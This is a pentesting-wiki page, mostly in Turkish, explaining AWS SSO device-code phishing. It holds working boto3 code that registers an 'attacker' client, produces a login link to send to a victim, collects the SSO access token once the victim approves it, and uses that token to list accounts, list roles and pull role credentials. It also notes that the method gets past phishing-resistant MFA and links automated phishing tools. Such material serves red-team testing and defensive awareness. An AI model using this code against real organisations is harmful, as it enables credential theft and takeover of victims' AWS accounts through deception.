# AWS - Identity Center & SSO Unauthenticated Enum

{{#include ../../../../banners/hacktricks-training.md}}

## AWS Device Code Phishing

İlk olarak [**this blog post**](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/) adresinde önerildiği üzere, AWS SSO kullanan bir kullanıcıya gönderilecek bir **bağlantı** ile eğer **kullanıcı kabul ederse** saldırganın **kullanıcıyı taklit etmek için bir token** elde etmesi ve kullanıcının Identity Center içinde erişebildiği tüm rollere erişmesi mümkündür.

Bu saldırıyı gerçekleştirmek için gereksinimler:

- Kurbanın **Identity Center** kullanıyor olması
- Saldırganın kurbanın kullandığı **alt alan adını (subdomain)** bilmesi `<victimsub>.awsapps.com/start`

Sadece bu bilgilerle, **saldırgan kullanıcıya bir bağlantı gönderebilecek** ve eğer **kabul edilirse** bu, **saldırgana AWS kullanıcı hesabı** üzerinde erişim sağlayacaktır.

### Saldırı

1. **Alt alan adının bulunması**

Saldırganın ilk adımı, hedef şirketin Identity Center'da kullandığı alt alan adını bulmaktır. Bu, çoğu şirket burada adlarını veya adlarının bir varyasyonunu kullandığı için **OSINT** veya **tahmin + BF** ile yapılabilir.

Bu bilgilerle, Identity Center'ın yapılandırıldığı bölgeyi şu şekilde öğrenmek mümkündür:
```bash
curl https://victim.awsapps.com/start/ -s | grep -Eo '"region":"[a-z0-9\-]+"'
"region":"us-east-1
```
2. **Victim için link oluştur & Gönder**

Aşağıdaki kodu çalıştırarak victim'in kimlik doğrulaması yapabilmesi için bir AWS SSO login linki oluşturun.  
Demo için bu kodu bir python konsolunda çalıştırın ve daha sonra token almak için bazı objelere ihtiyacınız olacağından konsoldan çıkmayın:
```python
import boto3

REGION = 'us-east-1' # CHANGE THIS
AWS_SSO_START_URL = 'https://victim.awsapps.com/start' # CHANGE THIS

sso_oidc = boto3.client('sso-oidc', region_name=REGION)
client = sso_oidc.register_client(
clientName = 'attacker',
clientType = 'public'
)

client_id = client.get('clientId')
client_secret = client.get('clientSecret')
authz = sso_oidc.start_device_authorization(
clientId=client_id,
clientSecret=client_secret,
startUrl=AWS_SSO_START_URL
)

url = authz.get('verificationUriComplete')
deviceCode = authz.get('deviceCode')
print("Give this URL to the victim: " + url)
```
Oluşturulan linki victim'e harika social engineering yeteneklerinle gönder!

3. **Victim kabul edene kadar bekleyin**

Eğer victim **already logged in AWS** ise, sadece permissions vermeyi kabul etmesi yeterli olacak; eğer değilse, **login yapıp sonra permissions vermeyi kabul etmesi** gerekecek.\
Bu prompt günümüzde şöyle görünüyor:

<figure><img src="../../../images/image (343).png" alt="" width="311"><figcaption></figcaption></figure>

4. **SSO access token alın**

Eğer victim prompt'u kabul ettiyse, bu kodu çalıştırarak **kullanıcıyı taklit ederek bir SSO token oluşturun**:
```python
token_response = sso_oidc.create_token(
clientId=client_id,
clientSecret=client_secret,
grantType="urn:ietf:params:oauth:grant-type:device_code",
deviceCode=deviceCode
)
sso_token = token_response.get('accessToken')
```
SSO access token **8 saat boyunca geçerlidir**.

5. **Kullanıcıyı taklit et**
```python
sso_client = boto3.client('sso', region_name=REGION)

# List accounts where the user has access
aws_accounts_response = sso_client.list_accounts(
accessToken=sso_token,
maxResults=100
)
aws_accounts_response.get('accountList', [])

# Get roles inside an account
roles_response = sso_client.list_account_roles(
accessToken=sso_token,
accountId=<account_id>
)
roles_response.get('roleList', [])

# Get credentials over a role

sts_creds = sso_client.get_role_credentials(
accessToken=sso_token,
roleName=<role_name>,
accountId=<account_id>
)
sts_creds.get('roleCredentials')
```
### Phishing the unphisable MFA

It's fun to know that the previous attack **works even if an "unphisable MFA" (webAuth) is being used**. This is because the previous **workflow never leaves the used OAuth domain**. Not like in other phishing attacks where the user needs to supplant the login domain, in the case the device code workflow is prepared so a **code is known by a device** and the user can login even in a different machine. If accepted the prompt, the device, just by **knowing the initial code**, is going to be able to **retrieve credentials** for the user.

For more info about this [**check this post**](https://mjg59.dreamwidth.org/62175.html).

### Otomatik Araçlar

- [https://github.com/christophetd/aws-sso-device-code-authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [https://github.com/sebastian-mora/awsssome_phish](https://github.com/sebastian-mora/awsssome_phish)

## Referanslar

- [https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/](https://blog.christophetd.fr/phishing-for-aws-credentials-via-aws-sso-device-code-authentication/)
- [https://ruse.tech/blogs/aws-sso-phishing](https://ruse.tech/blogs/aws-sso-phishing)
- [https://mjg59.dreamwidth.org/62175.html](https://mjg59.dreamwidth.org/62175.html)
- [https://ramimac.me/aws-device-auth](https://ramimac.me/aws-device-auth)

{{#include ../../../../banners/hacktricks-training.md}}
